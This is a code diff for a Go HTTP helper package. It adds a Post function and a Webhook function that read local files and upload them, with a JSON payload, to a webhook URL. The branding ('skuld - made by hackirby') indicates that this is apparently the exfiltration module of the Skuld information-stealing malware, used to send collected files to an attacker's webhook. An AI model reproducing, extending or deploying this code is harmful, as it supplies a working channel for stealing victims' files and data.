@@ -2,6 +2,7 @@ package requests
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"io"
 	"mime/multipart"
@@ -131,3 +132,88 @@ func Get(url string, headers ...map[string]string) ([]byte, error) {
 	return res, nil
 }
 
+func Post(url string, body []byte, headers ...map[string]string) ([]byte, error) {
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(body))
+	if err != nil {
+		return nil, err
+	}
+	if len(headers) > 0 {
+		for key, value := range headers[0] {
+			req.Header.Set(key, value)
+		}
+	}
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	res, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	return res, nil
+}
+func Webhook(webhook string, data map[string]interface{}, files ...string) {
+	var body bytes.Buffer
+	writer := multipart.NewWriter(&body)
+
+	i := 0
+
+	if len(files) > 10 {
+		Webhook(webhook, data)
+		for _, file := range files {
+			i++
+			Webhook(webhook, map[string]interface{}{"content": fmt.Sprintf("Attachment %d: `%s`", i, file)}, file)
+		}
+		return
+	}
+
+	for _, file := range files {
+		openedFile, err := os.Open(file)
+		if err != nil {
+			continue
+		}
+		defer openedFile.Close()
+
+		filePart, err := writer.CreateFormFile(fmt.Sprintf("file[%d]", i), openedFile.Name())
+		if err != nil {
+			continue
+		}
+
+		if _, err := io.Copy(filePart, openedFile); err != nil {
+			continue
+		}
+		i++
+	}
+
+	jsonPart, err := writer.CreateFormField("payload_json")
+	if err != nil {
+		return
+	}
+
+	data["username"] = "skuld"
+	data["avatar_url"] = "https://i.ibb.co/GFZ2tHJ/shakabaiano-1674282487.jpg"
+
+	if data["embeds"] != nil {
+		for _, embed := range data["embeds"].([]map[string]interface{}) {
+			embed["footer"] = map[string]interface{}{
+				"text":     "skuld - made by hackirby",
+				"icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+			}
+			embed["color"] = 0xb143e3
+		}
+	}
+
+	if err := json.NewEncoder(jsonPart).Encode(data); err != nil {
+		return
+	}
+
+	if err := writer.Close(); err != nil {
+		return
+	}
+
+	Post(webhook, body.Bytes(), map[string]string{"Content-Type": writer.FormDataContentType()})
+}
